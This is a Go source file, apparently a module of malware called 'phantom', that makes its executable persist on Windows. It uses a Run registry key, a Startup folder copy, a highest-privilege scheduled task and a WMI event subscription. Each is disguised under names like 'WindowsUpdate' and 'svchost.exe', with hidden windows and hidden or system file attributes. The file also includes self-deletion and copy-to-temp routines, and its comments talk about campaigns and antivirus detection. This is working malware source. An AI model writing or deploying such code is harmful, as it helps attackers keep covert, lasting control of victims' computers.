package persist

/*
	Persistence module

	Methods available:
	1. Registry Run key (most common, low priv)
	2. Startup folder (easy to detect but reliable)
	3. Scheduled task (requires more privs but stealthy)
	4. WMI subscription (very stealthy, hard to detect)

	Registry is default - works without admin and survives reboots

	WARNING: these are NOISY and will get flagged by most AVs
	Only enable for specific campaigns
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"phantom/syscalls"
	"syscall"
)

type PersistMethod int

const (
	Registry        PersistMethod = iota // HKCU Run key
	StartupFolder                        // Startup folder shortcut
	ScheduledTask                        // schtasks
	WMISubscription                      // WMI event subscription
)

// Install - establishes persistence using specified method
// Registry is default and works without admin
func Install(method PersistMethod) error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	switch method {
	case Registry:
		return installRegistry(exePath)
	case StartupFolder:
		return installStartupFolder(exePath)
	case ScheduledTask:
		return installScheduledTask(exePath)
	case WMISubscription:
		return installWMI(exePath)
	default:
		return installRegistry(exePath)
	}
}

// installRegistry adds to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
func installRegistry(exePath string) error {
	key, err := syscalls.RegOpenKey(syscalls.HKEY_CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`)
	if err != nil {
		return err
	}
	defer syscalls.RegCloseKey(key)

	return syscalls.RegSetValue(key, "WindowsUpdate", exePath)
}

// installStartupFolder copies to startup folder
func installStartupFolder(exePath string) error {
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	destPath := filepath.Join(startupPath, "svchost.exe")

	// copy current executable
	input, err := os.ReadFile(exePath)
	if err != nil {
		return err
	}

	err = os.WriteFile(destPath, input, 0644)
	if err != nil {
		return err
	}

	// hide the file
	hideFile(destPath)

	return nil
}

// installScheduledTask creates a scheduled task
func installScheduledTask(exePath string) error {
	taskName := "WindowsSecurityUpdate"

	// delete existing task if any
	delCmd := exec.Command("schtasks", "/delete", "/tn", taskName, "/f")
	delCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	delCmd.Run()

	// create new task - runs at logon
	createCmd := exec.Command("schtasks", "/create",
		"/tn", taskName,
		"/tr", exePath,
		"/sc", "onlogon",
		"/rl", "highest",
		"/f",
	)
	createCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return createCmd.Run()
}

// installWMI creates WMI event subscription for persistence
func installWMI(exePath string) error {
	// WMI event subscription - runs on specific event
	// This is more stealthy than scheduled tasks

	filterName := "WindowsUpdateFilter"
	consumerName := "WindowsUpdateConsumer"
	_ = "WindowsUpdateBinding" // binding created inline

	// create event filter (triggers every 60 seconds)
	filterCmd := fmt.Sprintf(`
		$filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
			Name = "%s"
			EventNameSpace = "root\cimv2"
			QueryLanguage = "WQL"
			Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
		}
	`, filterName)

	// create command line event consumer
	consumerCmd := fmt.Sprintf(`
		$consumer = Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{
			Name = "%s"
			CommandLineTemplate = "%s"
		}
	`, consumerName, exePath)

	// bind filter to consumer
	bindingCmd := fmt.Sprintf(`
		$binding = Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{
			Filter = $filter
			Consumer = $consumer
		}
	`)

	fullScript := filterCmd + "\n" + consumerCmd + "\n" + bindingCmd

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", fullScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

// hideFile sets file to hidden and system
func hideFile(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	attrs := uint32(syscall.FILE_ATTRIBUTE_HIDDEN | syscall.FILE_ATTRIBUTE_SYSTEM)
	return syscall.SetFileAttributes(pathPtr, attrs)
}

// Remove removes all persistence methods
func Remove() {
	// registry
	key, err := syscalls.RegOpenKey(syscalls.HKEY_CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`)
	if err == nil {
		// would need RegDeleteValue
		syscalls.RegCloseKey(key)
	}

	// startup folder
	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe")
	os.Remove(startupPath)

	// scheduled task
	delCmd := exec.Command("schtasks", "/delete", "/tn", "WindowsSecurityUpdate", "/f")
	delCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	delCmd.Run()

	// WMI
	wmiCmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", `
		Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
		Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
		Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*WindowsUpdateFilter*'} | Remove-WmiObject
	`)
	wmiCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	wmiCmd.Run()
}

// SelfDelete deletes the executable after execution
func SelfDelete() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// batch file to delete after delay
	batContent := fmt.Sprintf(`
@echo off
ping 127.0.0.1 -n 3 > nul
del /f /q "%s"
del /f /q "%%~f0"
`, exePath)

	batPath := filepath.Join(os.TempDir(), "cleanup.bat")
	err = os.WriteFile(batPath, []byte(batContent), 0644)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd", "/c", batPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Start()
}

// CopyToTemp copies executable to temp location
func CopyToTemp() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", err
	}

	data, err := os.ReadFile(exePath)
	if err != nil {
		return "", err
	}

	tempDir := os.TempDir()
	destPath := filepath.Join(tempDir, "svchost.exe")

	err = os.WriteFile(destPath, data, 0755)
	if err != nil {
		return "", err
	}

	hideFile(destPath)
	return destPath, nil
}

// RunFromTemp runs a copy from temp directory
func RunFromTemp() error {
	tempPath, err := CopyToTemp()
	if err != nil {
		return err
	}

	cmd := exec.Command(tempPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Start()
}
